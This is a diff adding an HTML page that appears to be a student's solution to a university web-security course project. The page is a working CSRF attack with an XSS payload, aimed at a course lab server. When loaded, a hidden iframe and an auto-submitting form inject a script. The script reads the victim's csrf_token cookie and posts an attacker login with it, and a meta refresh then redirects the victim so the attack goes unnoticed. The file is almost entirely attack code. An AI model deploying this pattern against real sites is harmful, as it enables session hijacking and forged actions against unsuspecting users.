@@ -1,0 +1,37 @@
+<html>
+    <body>
+        <!-- Stealthy IFrame (leave as-is) -->
+        <iframe name="BlankPage" style="visibility:hidden;"></iframe>
+
+        <!-- Update any "..." fields accordingly! -->
+        <form action="https://cs4440.eng.utah.edu/project3/search"
+              target="BlankPage"
+              name="EvilPayload"
+              method="GET">
+	
+	<!-- Sends a script through the hidden search field to make a post request to the login form -->
+        <input name="q" type="hidden" value="<script>
+                var stolen_token = document.cookie.split('csrf_token=')[1].substring(0,32);
+        $.post('https://cs4440.eng.utah.edu/project3/login', {
+	    username: 'attacker',
+	    password: 'l33th4x',
+            csrf_token: stolen_token
+	    });
+            </script>">
+            <input name="csrfdefense" value="1" type="hidden">
+	    <input name="username" value="attacker" type="hidden">
+	    <input name="password" value="l33th4x" type="hidden">
+            <input name="xssdefense" value="0" type="hidden">
+        </form>
+
+
+
+        <!-- Launch the attack! (leave as-is) -->
+        <script>
+            document.EvilPayload.submit();
+        </script>
+
+        <!-- Stealty redirect (leave as-is) -->
+        <meta http-equiv="refresh" content="1; URL=https://cs4440.eng.utah.edu/project3"/>
+    </body>
+</html>
